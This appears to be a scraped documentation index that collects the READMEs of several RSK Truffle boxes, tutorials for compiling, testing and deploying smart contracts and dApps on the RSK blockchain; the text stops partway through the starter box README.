... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK Truffle Plant Box\\n\\nTruffle box is configured to create a complete dApp using Truffle framework on [RSK Blockchain](https://developers.rsk.co/rsk/), including a user interface to interact with the smart contract.\\n\\n[RSK](https://www.rsk.co/) is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network.\\n\\nIt was inspired by [Truffle pet shop box](https://www.trufflesuite.com/boxes/pet-shop). \\nThanks, Truffle team :)\\n\\n## Requirements\\n\\nThere are a few technical requirements before we start. \\nTo use `Truffle boxes`, you need to have installed in your computer:\\n\\n- Git\\n- a POSIX compliant shell\\n- cURL\\n- Node.js and NPM\\n- a code editor\\n\\nIf you don\\'t have any of them installed, go to the tutorial [Truffle boxes prerequisites](https://developers.rsk.co/tutorials/truffle-boxes/truffle-boxes-prerequisites/) which have all the instructions to setup these requirements.\\n\\n**Truffle framework**\\n\\nOnce you have those requirements installed, you only need one command to install `Truffle`.\\nIt is better to do it globally:\\n\\n```shell\\nnpm install -g truffle\\n```\\n\\n## Installing the Truffle box\\n\\n1. Create a new folder. \\nFor example, create the folder `rsk-plant`.\\nNavigate to the folder in the terminal.\\n\\n```shell\\nmkdir rsk-plant\\ncd rsk-plant\\n```\\n\\n2. Run the unbox command. \\nThis also takes care of installing the necessary dependencies and it can take some time.\\n\\n```shell\\ntruffle unbox rsksmart/rsk-plant-box\\n```\\n\\nThis is the result using Windows OS:\\n\\n![truffle unbox](/images/image-01.png)\\n\\n## PlantShop.sol\\n\\nTake a look at the smart contract `PlantShop.sol`. You can check it out in folder `contracts`.\\n\\n![PlantShop.sol](/images/image-02.png)\\n\\nThis smart contract has:\\n\\n* A variable `buyers` to store an array with 16 posisions to store addresses\\n* A function `getBuyers` to return the list of addresses stored at variable `buyers`\\n* A function `buy` to update an address at variable `buyers`, in the number of position sent as parameter\\n\\n## Development console\\n\\nTruffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally.\\n\\n3. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now `truffle(develop)>`\\n\\n```shell\\ntruffle develop\\n```\\n\\nYou will now be in the truffle develop console with seeded accounts and their associated private keys listed.\\n\\n```txt\\nC:\\\\RSK\\\\rsk-plant>truffle develop\\n\\nTruffle Develop started at http://127.0.0.1:8545/\\n\\nAccounts:\\n(0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728\\n(1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c\\n(2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe\\n(3) 0x9576d0a496b645baa64f22aceb2328e7468d4113\\n(4) 0xd431572eef7d77584d944c1809398a155e89f830\\n(5) 0x92c111839718fe0800fadccc67068b40b8524a0f\\n(6) 0x6da22b5a027146619bfe6704957f7f36ff029c48\\n(7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867\\n(8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7\\n(9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b\\n\\nPrivate Keys:\\n(0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167\\n(1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3\\n(2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde\\n(3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e\\n(4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b\\n(5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847\\n(6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db\\n(7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb\\n(8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e\\n(9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63\\n\\nMnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber\\n\\n\\xe2\\x9a\\xa0\\xef\\xb8\\x8f Important \\xe2\\x9a\\xa0\\xef\\xb8\\x8f : This mnemonic was created for you by Truffle. It is not secure.\\nEnsure you do not use it on production blockchains, or else you risk losing funds.\\n\\ntruffle(develop)>\\n```\\n\\n> Inside the development console we don\\'t preface commands with `truffle`.\\n\\n4. Compile the smart contract. \\n\\n> To make sure you\\'re in the development console, the command prompt must be `truffle(develop)>`\\n\\n```shell\\ncompile\\n```\\n\\nThe `compile output` should be similar to:\\n\\n![truffle compile](/images/image-03.png)\\n\\n5. Deploy (migrate) the smart contract. \\n\\n```shell\\nmigrate\\n```\\n\\nAnd the `migrate output` should be similar to:\\n\\n![truffle migrate](/images/image-04.png)\\n\\n6. Testing the smart contract.\\n\\nThis Truffle box also comes with the file `TestPlantShop.js` which include some examples for testing the smart contract. \\nYou can check it out in the `test` folder.\\n\\nRun this command in the development console:\\n\\n```shell\\ntest\\n```\\n\\nThe `test output` should be similar to:\\n\\n![truffle test](/images/image-05.png)\\n\\n### Exit Truffle console\\n\\nIn the Truffle console, enter this command to exit the terminal:\\n\\n```shell\\n.exit\\n```\\n\\n## Using RSK networks\\n\\nThis Truffle box is already configured to connect to three RSK networks: \\n\\n1. regtest (local node)\\n2. testnet\\n3. mainnet\\n\\nTestnet will be used here. \\n\\nWe need to do some tasks:\\n\\n- Setup an account and get R-BTC\\n- Update RSK network gas price\\n- Connect to an RSK network\\n- Deploy in the network of your choose\\n\\n\\n### Setup an account & get R-BTC\\n\\n1. Create a wallet\\n\\nThe easy way to setup an account is using a web3 wallet injected in the browser.\\nSome options are:\\n- [Metamask](https://metamask.io/)\\n- [Nifty](https://www.poa.network/for-users/nifty-wallet)\\n\\nSelect the RSK Network in the web wallet.\\n- Nifty: select in the dropdown list\\n- Metamask: go to [RSK Testnet](https://developers.rsk.co/wallet/use/metamask/) to configure it in `Custom RPC`\\n\\n![wallets](/images/image-06.png)\\n\\nYou can learn more about [account based RSK addresses](https://developers.rsk.co/rsk/architecture/account-based/ \"Account based RSK addresses - RSK Developers Portal\").\\n\\nTake a look `truffle-config.js` file to realize that we are using `HDWalletProvider` with RSK Networks derivations path:\\n- RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n- RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\nFor more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n2. Update `.secret` file\\n\\nAfter create your wallet, update your mnemonic in the file `.secret`, located in the folder project, and save it.\\n\\n3. Get some R-BTCs:\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo update the Testnet **minimumGasPrice** in our project run this query using cURL:\\n\\n```shell\\ncurl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' > .minimum-gas-price-testnet.json\\n```\\n\\nThis query saved the details of latest block to file .minimum-gas-price-testnet.json \\n\\nIn the `truffle-config.js`, we are reading the parameter `minimumGasPrice` from this json file.\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go to the [gas page](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK Testnet\\n\\nRun the development console for any RSK network.\\n\\n```shell\\ntruffle console --network testnet\\n```\\n\\n### Test the connection to RSK network\\n\\nRun this commands in the Truffle console:\\n\\n**Block number**\\n\\nShows the last block number.\\n\\n```javascript\\n(await web3.eth.getBlockNumber()).toString()\\n```\\n**Network ID**\\n\\nTo get the network ID, run this command:\\n\\n```javascript\\n(await web3.eth.net.getId()).toString()\\n```\\n\\nList of network IDs:\\n- mainnet: 30\\n- testnet: 31\\n- regtest (local node): 33\\n\\nCheck it out the last steps in this image:\\n\\n![connect to rsk network](/images/image-07.png)\\n\\nYou can verify that I get the last block twice, and the block number inscreased, so we conclude that the connection is ok.\\n\\nExit the Truffle console:\\n\\n```shell\\n.exit\\n```\\n\\n### Migrate the smart contract \\n\\nWe will do it running the below commands directly in the terminal, without using the Truffle console, to show you this alternative.\\n\\nOn any of the networks, run this commands in a terminal (not in Truffle console).\\nTo use Testnet or Mainnet, you need to specify this using the parameter `-- network`:\\n\\n```shell\\ntruffle migrate --network testnet\\n```\\n\\nThe migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain.\\n\\n## The dApp\\n\\nIncluded with the plant-shop Truffle Box was the code for the app\\'s front-end. That code exists within the `src` directory.\\n\\n> Make sure you have selected the RSK testnet in the wallet.\\n\\n### Running the dev server\\n\\nNow we\\'re ready to use our dapp!\\n\\nStart the local web server:\\n\\n```shell\\nnpm run dev\\n```\\n\\nThe dev server will launch and automatically open a new browser tab containing your dapp.\\n\\nIt is running at [http://localhost:3000](http://localhost:3000)\\n\\n![rsk plant garden](/images/image-11.png)\\n\\n### Buying plants\\n\\nIn our garden store, don\\'t worry about the prices, the plants are free!\\n\\nClick the `Get` button on the plant of your choice.\\n\\nYou\\'ll be automatically prompted to approve the transaction by the web wallet. \\nClick submit / confirm to approve the transaction.\\n\\nAfter the transaction is confirmed, you\\'ll see the button next to the choosed plant change to show the first characters of the wallet that got the plant and become disabled, just as we specified, because the plant has now been acquired.\\n\\nCongratulations\\xf0\\x9f\\x91\\x8f\\xf0\\x9f\\x91\\x8f\\xf0\\x9f\\x91\\x8f! You built and ran a complete dApp on RSK network!\\n\\n### Do you have questions?\\n\\nAsk in the [RSK chat](https://gitter.im/rsksmart/getting-started).\\n\\n'","title":"Index"},{"location":"boxes/rsk-react-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-react-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK React Truffle Box\\n\\nThis box comes with everything you need to start using smart contracts from a react app on RSK Network. This box was ported and adapted from [React Truffle Box](https://github.com/truffle-box/react-box) to RSK.\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command via `npx` and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the `client` directory.\\n ```js\\n npx truffle unbox rsksmart/rsk-react-box\\n ```\\n\\n2. Alternatively, you can install Truffle globally and run the `unbox` command.\\n ```javascript\\n npm install -g truffle\\n truffle unbox rsksmart/rsk-react-box\\n ```\\n\\n3. Run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don\\'t preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n\\n5. In the `client` directory, we run the React app. Smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n // in another terminal (i.e. not in the truffle develop prompt)\\n cd client\\n npm run start\\n ```\\n\\n6. Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you\\'re in or outside of the development console.\\n ```javascript\\n // inside the development console.\\n test\\n\\n // outside the development console..\\n truffle test\\n ```\\n\\n7. Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors.\\n ```javascript\\n // ensure you are inside the client directory when running this\\n npm run test\\n ```\\n\\n8. To build the application for production, use the build script. A production build will be in the `client/build` folder.\\n ```javascript\\n // ensure you are inside the client directory when running this\\n npm run build\\n ```\\n## RSK\\n\\n### Setup an account & get R-BTC\\n\\n- Get an address using [these instructions](https://developers.rsk.co/rsk/architecture/account-based/ \"Account Based RSK Addresses - RSK Developers Portal\").\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n- For the RSK Mainnet, get R-BTC from [an exchange](https://developers.rsk.co/rsk/rbtc/).\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send RBTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo get the **minimumGasPrice** do the following steps:\\n1. Run this query using cURL:\\n\\n **Mainnet**\\n\\n ```shell\\n curl https://public-node.rsk.co/ \\\\\\n -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\'\\n ```\\n\\n **Testnet**\\n\\n ```shell\\n curl https://public-node.testnet.rsk.co/ \\\\\\n -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\'\\n ```\\n\\n2. Find in the result the field **_minimumGasPrice_**\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go [here](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK\\n\\n1. Copy your mnemonic to `truffle-config.js`\\n\\n ```javascript\\n // truffle-config.json\\n\\n const HDWalletProvider = require(\\'@truffle/hdwallet-provider\\');\\n\\n //Put your mnemonic here, be careful not to deploy your mnemonic into production!\\n const mnemonic = \\'A_MNEMONIC\\';\\n ```\\n Please be aware that we are using `HDWalletProvider` with RSK Networks derivations path:\\n - RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n - RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\n For more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n2. Check the gas price of the network, and update `truffle-config.js` if necessary.\\n\\n3. Run the development console for any RSK network.\\n\\n ```shell\\n # Console for Mainnet\\n truffle console --network mainnet\\n\\n # Console forn Testnet\\n truffle console --network testnet\\n ```\\n\\n4. Compile and migrate the smart contracts. Note that inside the development console, we don\\'t preface commands with truffle.\\n\\n ```shell\\n compile\\n migrate\\n ```\\n\\n**Then continue from step 5 of [installation steps](#installation)**\\n'","title":"Index"},{"location":"boxes/rsk-react-express-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-react-express-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK React + Express JS Box\\n\\nThis box comes with everything you need to start using [express JS](https://expressjs.com/) to provide API endpoints to smart contracts and a [react app](https://reactjs.org/) to interact with them on [RSK Blockchain](https://developers.rsk.co/rsk/).\\nIt includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy.\\n\\n## Requirements\\n\\n1. [NPM (Node Package Manager)](https://nodejs.org/en/) and \\nNode.js are needed, though both are usually installed at once.\\n\\nGo to [Node.js](https://nodejs.org/en/) if you need to install it.\\n\\n2. Truffle\\n\\nInstall Truffle globally:\\n\\n```shell\\nnpm install -g truffle\\n```\\n\\n## Installation\\n\\n1. Create a new folder.\\nFor example, create the folder `rsk-react-express`.\\nNavigate to the folder in the terminal.\\n\\n```shell\\nmkdir rsk-react-express\\ncd rsk-react-express\\n```\\n\\n2. Run the unbox command. It can take some time, as this will install all necessary dependencies.\\n\\n```shell\\ntruffle unbox rsksmart/rsk-react-express-box\\n```\\n\\nA `client-server` application is generated in the `app` directory.\\n\\nThis is the result using Windows OS:\\n\\n![truffle unbox](/images/image-01.png)\\n\\n## Development console\\n\\nTruffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally.\\n\\n3. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now `truffle(develop)>`\\n\\n```shell\\ntruffle develop\\n```\\n\\nYou will now be in the truffle develop REPL with seeded accounts and their associated private keys listed.\\n\\n```txt\\nC:\\\\RSK\\\\rsk-next>truffle develop\\n\\nTruffle Develop started at http://127.0.0.1:8545/\\n\\nAccounts:\\n(0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728\\n(1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c\\n(2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe\\n(3) 0x9576d0a496b645baa64f22aceb2328e7468d4113\\n(4) 0xd431572eef7d77584d944c1809398a155e89f830\\n(5) 0x92c111839718fe0800fadccc67068b40b8524a0f\\n(6) 0x6da22b5a027146619bfe6704957f7f36ff029c48\\n(7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867\\n(8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7\\n(9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b\\n\\nPrivate Keys:\\n(0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167\\n(1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3\\n(2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde\\n(3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e\\n(4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b\\n(5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847\\n(6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db\\n(7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb\\n(8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e\\n(9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63\\n\\nMnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber\\n\\n\\xe2\\x9a\\xa0\\xef\\xb8\\x8f Important \\xe2\\x9a\\xa0\\xef\\xb8\\x8f : This mnemonic was created for you by Truffle. It is not secure.\\nEnsure you do not use it on production blockchains, or else you risk losing funds.\\n\\ntruffle(develop)>\\n```\\n\\n4. Take a look at the smart contract `SimpleStorage.sol`. You can check it out in folder `contracts`.\\n\\nThis smart contract has:\\n\\n* A variable `storedData` to store a number\\n* A function `get()` to return the number stored at variable `storedData`\\n* A function `set()` to change the number stored at variable `storedData`\\n\\n5. Compile and migrate the smart contract. Note, inside the development console we don\\'t preface commands with `truffle`.\\n\\n> To make sure you\\'re in the development console, the command prompt must be `truffle(develop)>`\\n\\n```shell\\ncompile\\n```\\n\\nThe `compile output` should be similar to:\\n\\n![truffle compile](/images/image-02.png)\\n\\n```shell\\nmigrate\\n```\\n\\nAnd the `migrate output` should be similar to:\\n\\n![truffle migrate](/images/image-03.png)\\n\\n6. Running contract tests.\\n\\nThis Truffle box also comes with the file `TestSimpleStorage.js` for testing the smart contract. You can check it out in the `test` folder.\\n\\nRun this command in the development console:\\n\\n```shell\\ntest\\n```\\n\\nThis `test output` should be similar to:\\n\\n![truffle test](/images/image-04.png)\\n\\nNote the command varies slightly if you\\'re in or outside of the development console.\\n\\n```javascript\\n// inside the development console.\\ntest\\n\\n// outside the development console.\\ntruffle test\\n```\\n\\n## The application\\n\\nOur box is a client-server: \\n- Server uses `express JS` to interact with the smart contract.\\n- Client uses `react` app.\\n\\n7. Running in development mode\\n\\nIn another terminal (i.e. not in the truffle develop prompt), go to the `app` directory and run the app in development mode.\\n\\n> Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator.\\n> \\n> If you close it and then open it again, you need to deploy / migrate the smart contract again too!\\n\\n```shell\\ncd app\\nnpm run dev\\n```\\n\\nThis command executes server and client applications and you can access it in your browser:\\n\\n- Server: [http://localhost:8080/](http://localhost:8080/)\\n- Client: [http://localhost:3000/](http://localhost:3000/)\\n\\n> Smart contract changes must be manually recompiled and migrated!\\n\\n**NOTE**: This box is the starting point for the RSK tutorial [using rsk-react-express-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-react-express-box/).\\n\\n8. Running the production server\\n\\nYou can choose to run only the production server. In another terminal (i.e. not in the truffle develop prompt), go to the `app` directory and run the app in production mode.\\n\\n```shell\\ncd app\\nnpm start\\n```\\n\\n> If you have `yarn` installed, you can use `yarn start`.\\n\\nThen go to your browser at [http://localhost:8080/](http://localhost:8080/)\\n\\n![localhost port 8080](/images/image-11.png)\\n\\n> When you are running only the production server, for any change you need to stop and run the server again for the updates to take effect!\\n\\n9. To build the application for production, use the build script in the `app` folder. A production build will be in the `app/dist` folder.\\n\\n```javascript\\nnpm run build\\n```\\n\\nTake a look in the `app/dist` folder:\\n\\n![dist folder](/images/image-13.png)\\n\\n## Using RSK networks\\n\\nThis Truffle box is already configured to connect to both RSK networks: testnet and mainnet. We need only to update few items:\\n\\n- Setup an account & get R-BTC\\n- RSK network gas price\\n- Your wallet mnemonic\\n- Choose the network in the app\\n\\n### Setup an account & get R-BTC\\n\\n- Get an address, learning how works the [account based RSK addresses](https://developers.rsk.co/rsk/architecture/account-based/ \"Account based RSK addresses - RSK Developers Portal\").\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n- For the RSK Mainnet, get R-BTC from [an exchange](https://developers.rsk.co/rsk/rbtc/).\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo update the **minimumGasPrice** in our project run this query using cURL:\\n\\n**Testnet**\\n\\n```shell\\ncurl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-testnet.json\\n```\\n\\n**Mainnet**\\n\\n```shell\\ncurl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-mainnet.json\\n```\\n\\nThis query saved the details of latest block to \\nfile .minimum-gas-price-testnet.json \\nor .minimum-gas-price-mainnet.json, respectively.\\n\\nIn the `truffle-config.js`, we are reading the parameter `minimumGasPrice` in each json file.\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go to the [gas page](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK\\n\\n1. Copy your mnemonic to `truffle-config.js`\\n\\n```javascript\\n//Put your mnemonic here, be careful not to deploy your mnemonic into production!\\nconst mnemonic = \\'A_MNEMONIC\\';\\n```\\n\\nPlease be aware that we are using `HDWalletProvider` with RSK Networks derivations path:\\n- RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n- RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\nFor more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n2. Run the development console for any RSK network.\\n\\n```shell\\n# Console for Testnet\\ntruffle console --network testnet\\n\\n# Console for Mainnet\\ntruffle console --network mainnet\\n```\\n\\n3. Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative.\\n\\n```shell\\ntruffle migrate\\n```\\n4. Update express JS component. \\n\\nThe express server uses the [web3.js](https://web3js.readthedocs.io/) library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts.\\n\\nChoose which RSK network you would like to connect the server to \\nand update line 11 of the file `app/src/server/index.js`\\n\\n**Testnet**\\n```js \\nconst provider = new Web3.providers.HttpProvider(\"https://public-node.testnet.rsk.co\"); \\n```\\n\\n**Mainnet**\\n```js \\nconst provider = new Web3.providers.HttpProvider(\"https://public-node.rsk.co\");\\n```\\n\\n5. In a terminal, go to the `app` directory and run the app.\\n\\nFor example, this command will run the production server:\\n\\n```shell\\ncd app\\nnpm start\\n```\\n\\nThen go to your browser at [http://localhost:8080/](http://localhost:8080/)\\n\\n> Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network.\\n\\n## Next steps\\n\\n- **Go to tutorial**\\n\\nGo to the tutorial [using rsk-react-express-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-react-express-box/) to learn more about this project. We covered all the steps with more details, explanations, and images.\\n\\n- **Find more documentation**\\n\\nCheck out the [RSK developers portal](https://developers.rsk.co/).\\n\\n- **Do you have questions?**\\n\\nAsk in the [RSK chat](https://gitter.im/rsksmart/getting-started).\\n'","title":"Index"},{"location":"boxes/rsk-starter-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-starter-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK Truffle Starter Box\\n\\nThis box comes with everything you need to start using Truffle on [RSK Blockchain](https://developers.rsk.co/rsk/).\\nIt includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy.\\n\\n[RSK](https://www.rsk.co/) is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network.\\n\\n## Requirements\\n\\n1. [NPM (Node Package Manager)](https://nodejs.org/en/)\\nNode.js and NPM are needed, though both are usually installed at once.\\n\\nGo to [Node.js](https://nodejs.org/en/) if you need to install it.\\n\\n2. Truffle\\n\\nInstall Truffle globally\\n\\n```shell\\nnpm install -g truffle\\n```\\n\\n## Installation\\n\\n1. Create a new folder.\\nFor example, create the folder `rsk-starter`.\\nNavigate to the folder in the terminal.\\n\\n```shell\\nmkdir rsk-starter\\ncd rsk-starter\\n```\\n\\n2. Run the unbox command. It can take some time, as this will install all necessary dependencies.\\n\\n```shell\\ntruffle unbox rsksmart/rsk-starter-box\\n```\\n\\nThis is the result using Windows OS:\\n\\n![truffle unbox](/images/rsk-starter-box-01.png)\\n\\n## Development console\\n\\nTruffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally.\\n\\n3. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now `truffle(develop)>`\\n\\n```shell\\ntruffle develop\\n```\\n\\nYou will now be in the truffle develop REPL with seeded accounts and their associated private keys listed.\\n\\n```txt\\nTruffle Develop started at http://127.0.0.1:9545/\\n\\nAccounts:\\n(0) 0x4579996629f631d5221c9ea0c3552f6dcff61e9e\\n(1) 0x52f43fccc4ffcbb9f0a57320401139ef4088093f\\n(2) 0xea7e59d8403587bdb1c12758eb33f82dc9e0a451\\n(3) 0x9eed1b59ac18360b67b7ef2a069f8c35ad62b009\\n(4) 0x064874a46fc29fd15736cc0c890276fe1dfb9ecc\\n(5) 0x2c612c461690ab601977595028ba1ed62e98d605\\n(6) 0x50a317d18a78e4ad8491c0696582da35ba30b12a\\n(7) 0xdf68b82ac51d21c731b8aa3c9c1d65c62ffb1b75\\n(8) 0x018c7c87900304eeff2f852def58776b920b9da2\\n(9) 0xdc2fe4385c54349c0303e448333a5de1131bc88e\\n\\nPrivate Keys:\\n(0) 0895ef2194a15575ac9e75c5c837853637af444442f7b64dcea60029e68df5f6\\n(1) 1ca9f748b4d92ca6b9ffcc4f0027a17189871f250666fa20c08bc901a6757174\\n(2) 97e256de57f8206741223fe20953d047429b85f8a0ed5ec00a459cbf6e5859c4\\n(3) 7dc0ba635a4fe0af8be559446f34be036bc2aa055a34d81337601ba929b1892c\\n(4) c2dc9ba56f683ba2090de3932ab991f60c6e08535d2a8ffcc4c3ddea4b9be2f8\\n(5) e4943ce248e556559f5b5e0cc097215a440ca2dafcaddef9fbad79bef58e028d\\n(6) fbe436944b525e468209299b0e35f93a287bc0c25411418f10a9c2292ccbca8f\\n(7) 0381515a5f83c9c97683a370383f45a4d2c8de61299d8a0e03c2313a5ace2457\\n(8) ed39e1a942bf3c48c744bd5282410c811c56dbbec2bd133d09c43cd005a31e7b\\n(9) 2dd9fbe98b5a4bad9f619e260f99db699d5b80b3081c0bc283647b576e44b89a\\n\\nMnemonic: butter mention wealth vicious fancy plastic treat title filter excess witness bus\\n\\n\\xe2\\x9a\\xa0\\xef\\xb8\\x8f Important \\xe2\\x9a\\xa0\\xef\\xb8\\x8f : This mnemonic was created for you by Truffle. It is not secure.\\nEnsure you do not use it on production blockchains, or else you risk losing funds.\\n```\\n\\n4. Take a look at the smart contract `SimpleStorage.sol`. You can check it out in folder `contracts`.\\n\\nThis smart contract has:\\n\\n* A variable `storedData` to store a number\\n* A function `get()` to return the number stored at variable `storedData`\\n* A function `set()` to change the number stored at variable 